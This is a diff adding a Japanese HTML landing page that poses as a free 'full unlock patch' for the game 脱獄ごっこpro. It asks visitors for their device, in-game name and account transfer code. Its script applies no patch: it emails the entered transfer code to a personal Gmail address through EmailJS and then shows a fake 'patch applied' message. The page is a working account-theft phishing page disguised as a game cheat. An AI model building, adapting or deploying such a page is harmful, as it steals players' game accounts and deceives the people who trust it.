@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>脱獄ごっこ - 全開放パッチ</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Noto+Sans+JP:wght@300;400;700;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --neon-blue: #00d4ff;
+    --neon-pink: #ff2d75;
+    --neon-green: #39ff14;
+    --dark-bg: #0a0a12;
+    --card-bg: rgba(15, 15, 30, 0.85);
+    --glass-border: rgba(0, 212, 255, 0.2);
+  }
+
+  body {
+    background: var(--dark-bg);
+    color: #e0e0e0;
+    font-family: 'Noto Sans JP', sans-serif;
+    overflow-x: hidden;
+  }
+
+  .bg-grid {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    z-index: 0;
+    animation: gridScroll 20s linear infinite;
+  }
+
+  @keyframes gridScroll {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(60px, 60px); }
+  }
+
+  .bg-glow {
+    position: fixed;
+    width: 600px; height: 600px;
+    border-radius: 50%;
+    filter: blur(150px);
+    opacity: 0.15;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .bg-glow-1 { background: var(--neon-blue); top: -200px; right: -100px; }
+  .bg-glow-2 { background: var(--neon-pink); bottom: -200px; left: -100px; }
+  .bg-glow-3 { background: var(--neon-green); top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.05; }
+
+  nav {
+    position: fixed; top: 0; width: 100%; z-index: 100;
+    padding: 20px 40px;
+    display: flex; justify-content: space-between; align-items: center;
+    backdrop-filter: blur(20px);
+    background: rgba(10,10,18,0.7);
+    border-bottom: 1px solid var(--glass-border);
+  }
+
+  .logo {
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 900;
+    font-size: 22px;
+    background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 2px;
+  }
+
+  nav a {
+    color: #aaa;
+    text-decoration: none;
+    margin-left: 30px;
+    font-size: 14px;
+    font-weight: 400;
+    transition: color 0.3s;
+  }
+
+  nav a:hover { color: var(--neon-blue); }
+
+  .hero {
+    position: relative; z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 120px 20px 80px;
+  }
+
+  .hero-badge {
+    display: inline-block;
+    padding: 6px 18px;
+    border: 1px solid var(--neon-green);
+    color: var(--neon-green);
+    border-radius: 50px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 30px;
+    animation: fadeInUp 0.8s ease-out;
+  }
+
+  .hero h1 {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(36px, 7vw, 80px);
+    font-weight: 900;
+    line-height: 1.1;
+    margin-bottom: 10px;
+    animation: fadeInUp 0.8s ease-out 0.1s both;
+  }
+
+  .hero h1 .gradient-text {
+    background: linear-gradient(135deg, var(--neon-blue) 0%, var(--neon-pink) 50%, var(--neon-green) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-size: 200% 200%;
+    animation: gradientShift 4s ease infinite;
+  }
+
+  @keyframes gradientShift {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+  }
+
+  .hero-sub {
+    font-size: clamp(16px, 2.5vw, 22px);
+    color: #888;
+    font-weight: 300;
+    margin-bottom: 40px;
+    animation: fadeInUp 0.8s ease-out 0.2s both;
+  }
+
+  .hero-cta {
+    display: inline-block;
+    padding: 16px 50px;
+    background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
+    color: #fff;
+    text-decoration: none;
+    border-radius: 60px;
+    font-weight: 700;
+    font-size: 16px;
+    letter-spacing: 1px;
+    transition: transform 0.3s, box-shadow 0.3s;
+    animation: fadeInUp 0.8s ease-out 0.3s both;
+    cursor: pointer;
+    border: none;
+  }
+
+  .hero-cta:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 40px rgba(0,212,255,0.3), 0 10px 40px rgba(255,45,117,0.2);
+  }
+
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section {
+    position: relative; z-index: 1;
+    padding: 100px 20px;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 60px;
+    color: #fff;
+  }
+
+  .section-title span {
+    color: var(--neon-blue);
+  }
+
+  .features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 24px;
+  }
+
+  .feature-card {
+    background: var(--card-bg);
+    border: 1px solid var(--glass-border);
+    border-radius: 16px;
+    padding: 36px 30px;
+    backdrop-filter: blur(10px);
+    transition: transform 0.3s, border-color 0.3s;
+  }
+
+  .feature-card:hover {
+    transform: translateY(-6px);
+    border-color: var(--neon-blue);
+  }
+
+  .feature-icon {
+    font-size: 36px;
+    margin-bottom: 16px;
+  }
+
+  .feature-card h3 {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: #fff;
+  }
+
+  .feature-card p {
+    font-size: 14px;
+    line-height: 1.7;
+    color: #999;
+  }
+
+  .steps {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    position: relative;
+  }
+
+  .steps::before {
+    content: '';
+    position: absolute;
+    left: 30px;
+    top: 0; bottom: 0;
+    width: 2px;
+    background: linear-gradient(180deg, var(--neon-blue), var(--neon-pink), var(--neon-green));
+  }
+
+  .step {
+    display: flex;
+    align-items: flex-start;
+    gap: 24px;
+    padding: 30px 0;
+  }
+
+  .step-num {
+    width: 60px; height: 60px;
+    min-width: 60px;
+    border-radius: 50%;
+    background: var(--card-bg);
+    border: 2px solid var(--neon-blue);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 900;
+    font-size: 20px;
+    color: var(--neon-blue);
+    z-index: 1;
+  }
+
+  .step-content h3 {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: #fff;
+  }
+
+  .step-content p {
+    font-size: 14px;
+    color: #999;
+    line-height: 1.7;
+  }
+
+  .form-section {
+    position: relative; z-index: 1;
+    padding: 100px 20px;
+  }
+
+  .form-wrapper {
+    max-width: 500px;
+    margin: 0 auto;
+    background: var(--card-bg);
+    border: 1px solid var(--glass-border);
+    border-radius: 20px;
+    padding: 50px 40px;
+    backdrop-filter: blur(20px);
+  }
+
+  .form-wrapper h2 {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 24px;
+    text-align: center;
+    margin-bottom: 30px;
+    color: #fff;
+  }
+
+  .field {
+    margin-bottom: 20px;
+  }
+
+  .field label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--neon-blue);
+    margin-bottom: 8px;
+    letter-spacing: 1px;
+    padding-left: 2px;
+  }
+
+  .field input[type="text"] {
+    width: 100%;
+    padding: 12px 16px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 10px;
+    color: #fff;
+    font-size: 15px;
+    font-family: 'Noto Sans JP', sans-serif;
+    transition: border-color 0.3s;
+    outline: none;
+  }
+
+  .field input[type="text"]:focus {
+    border-color: var(--neon-blue);
+  }
+
+  .field-radio {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 24px 0;
+    padding: 14px 16px;
+    background: rgba(57,255,20,0.05);
+    border: 1px solid rgba(57,255,20,0.15);
+    border-radius: 10px;
+    cursor: pointer;
+  }
+
+  .field-radio input[type="radio"] {
+    accent-color: var(--neon-green);
+    width: 18px; height: 18px;
+  }
+
+  .field-radio span {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--neon-green);
+  }
+
+  .form-error {
+    color: var(--neon-pink);
+    font-size: 13px;
+    text-align: center;
+    margin-bottom: 16px;
+    display: none;
+  }
+
+  .form-btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: transform 0.2s, box-shadow 0.2s;
+    font-family: 'Noto Sans JP', sans-serif;
+  }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
+    color: #fff;
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 30px rgba(0,212,255,0.3);
+  }
+
+  .btn-secondary {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.15);
+    color: #aaa;
+    margin-top: 10px;
+  }
+
+  .btn-secondary:hover {
+    border-color: var(--neon-blue);
+    color: #fff;
+  }
+
+  .confirm-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 14px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    font-size: 14px;
+  }
+
+  .confirm-row .cl { color: #666; }
+  .confirm-row .cv { color: #fff; font-weight: 700; }
+
+  .complete-icon {
+    font-size: 60px;
+    text-align: center;
+    margin-bottom: 16px;
+  }
+
+  .complete-text {
+    text-align: center;
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--neon-green);
+    margin-bottom: 30px;
+  }
+
+  footer {
+    position: relative; z-index: 1;
+    text-align: center;
+    padding: 40px 20px;
+    font-size: 12px;
+    color: #444;
+    border-top: 1px solid rgba(255,255,255,0.03);
+  }
+
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--dark-bg); }
+  ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+
+  @media (max-width: 600px) {
+    nav { padding: 16px 20px; }
+    nav a { margin-left: 15px; font-size: 12px; }
+    .form-wrapper { padding: 30px 24px; }
+    .steps::before { left: 20px; }
+    .step-num { width: 40px; height: 40px; min-width: 40px; font-size: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+<div class="bg-glow bg-glow-3"></div>
+
+<nav>
+  <div class="logo">JAILBREAK PATCH</div>
+  <div>
+    <a href="#features">特徴</a>
+    <a href="#howto">使い方</a>
+    <a href="#patch">パッチ導入</a>
+  </div>
+</nav>
+
+<section class="hero">
+  <div class="hero-badge">&#9889; 無料 &bull; 簡単 &bull; 安全</div>
+  <h1><span class="gradient-text">全開放</span><br>WEB PATCH</h1>
+  <p class="hero-sub">脱獄ごっこpro のすべてを解放する</p>
+  <a href="#patch" class="hero-cta">今すぐパッチ導入</a>
+</section>
+
+<section class="section" id="features">
+  <h2 class="section-title">なぜ <span>全開放パッチ</span> ？</h2>
+  <div class="features">
+    <div class="feature-card">
+      <div class="feature-icon">&#128274;</div>
+      <h3>全アイテム解放</h3>
+      <p>ロックされたスキン、武器、コスチュームをすべてアンロック。制限なしで遊べます。</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">&#9889;</div>
+      <h3>即時適用</h3>
+      <p>パッチの導入は数秒で完了。難しい操作は一切不要です。</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">&#128737;</div>
+      <h3>安全設計</h3>
+      <p>WEBベースで動作するため、端末にアプリをインストールする必要はありません。</p>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="howto">
+  <h2 class="section-title">使い方は <span>3ステップ</span></h2>
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <h3>情報を入力</h3>
+        <p>端末の種類、ゲーム内の名前、引き継ぎコードを入力します。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <h3>パッチを選択</h3>
+        <p>「全開放Patch導入」を選択して、決定ボタンを押します。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <h3>完了！</h3>
+        <p>確認画面で内容をチェックしてOKを押せば、パッチが適用されます。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="form-section" id="patch">
+  <div class="form-wrapper">
+    <h2>PATCH導入</h2>
+
+    <div id="screen-form">
+      <div class="field">
+        <label>自分の端末の種類</label>
+        <input type="text" id="device" placeholder="例：iPhone 15, Android">
+      </div>
+      <div class="field">
+        <label>脱獄ごっこproの自分の名前</label>
+        <input type="text" id="username" placeholder="ゲーム内の名前">
+      </div>
+      <div class="field">
+        <label>脱プロ自分の引き継ぎコード</label>
+        <input type="text" id="code" placeholder="引き継ぎコード">
+      </div>
+      <label class="field-radio">
+        <input type="radio" name="patch" id="patchRadio">
+        <span>全開放Patch導入</span>
+      </label>
+      <div class="form-error" id="errorMsg">※ すべての項目を入力し、Patchを選択してください。</div>
+      <button class="form-btn btn-primary" onclick="showConfirm()">決定</button>
+    </div>
+
+    <div id="screen-confirm" style="display:none;">
+      <p style="text-align:center; color:#888; margin-bottom:24px; font-size:14px;">以下の内容でよろしいですか？</p>
+      <div class="confirm-row"><span class="cl">端末の種類</span><span class="cv" id="conf-device"></span></div>
+      <div class="confirm-row"><span class="cl">名前</span><span class="cv" id="conf-username"></span></div>
+      <div class="confirm-row"><span class="cl">引き継ぎコード</span><span class="cv" id="conf-code"></span></div>
+      <div class="confirm-row"><span class="cl">Patch導入</span><span class="cv" id="conf-patch"></span></div>
+      <button class="form-btn btn-primary" onclick="complete()" style="margin-top:24px;">OK</button>
+      <button class="form-btn btn-secondary" onclick="goBack()">戻る</button>
+    </div>
+
+    <div id="screen-complete" style="display:none;">
+      <div class="complete-icon">&#10003;</div>
+      <p class="complete-text">パッチ適用完了！</p>
+      <button class="form-btn btn-secondary" onclick="reset()">最初に戻る</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  &copy; 2025 全開放WEB-Patch. All rights reserved.
+</footer>
+
+<script>
+  emailjs.init('8Yh2MjikbWAjfD1DI');
+
+  function showConfirm() {
+    var device = document.getElementById('device').value.trim();
+    var username = document.getElementById('username').value.trim();
+    var code = document.getElementById('code').value.trim();
+    var patch = document.getElementById('patchRadio').checked;
+
+    if (!device || !username || !code || !patch) {
+      document.getElementById('errorMsg').style.display = 'block';
+      return;
+    }
+    document.getElementById('errorMsg').style.display = 'none';
+
+    document.getElementById('conf-device').textContent = device;
+    document.getElementById('conf-username').textContent = username;
+    document.getElementById('conf-code').textContent = code;
+    document.getElementById('conf-patch').textContent = '選択済み';
+
+    document.getElementById('screen-form').style.display = 'none';
+    document.getElementById('screen-confirm').style.display = 'block';
+  }
+
+  function goBack() {
+    document.getElementById('screen-confirm').style.display = 'none';
+    document.getElementById('screen-form').style.display = 'block';
+  }
+
+  function complete() {
+    var device = document.getElementById('device').value.trim();
+    var username = document.getElementById('username').value.trim();
+    var code = document.getElementById('code').value.trim();
+
+    emailjs.send('service_4co78uu', 'template_zl5ih37', {
+      device: device,
+      username: username,
+      code: code,
+      patch: '全開放Patch導入：選択済み',
+      to_email: 'yurimobing825@gmail.com'
+    }).then(function() {
+      document.getElementById('screen-confirm').style.display = 'none';
+      document.getElementById('screen-complete').style.display = 'block';
+    }, function(error) {
+      alert('送信に失敗しました。もう一度お試しください。');
+    });
+  }
+
+  function reset() {
+    document.getElementById('device').value = '';
+    document.getElementById('username').value = '';
+    document.getElementById('code').value = '';
+    document.getElementById('patchRadio').checked = false;
+    document.getElementById('screen-complete').style.display = 'none';
+    document.getElementById('screen-form').style.display = 'block';
+  }
+
+  document.querySelectorAll('a[href^="#"]').forEach(function(a) {
+    a.addEventListener('click', function(e) {
+      e.preventDefault();
+      document.querySelector(this.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });
+    });
+  });
+</script>
+
+</body>
+</html>
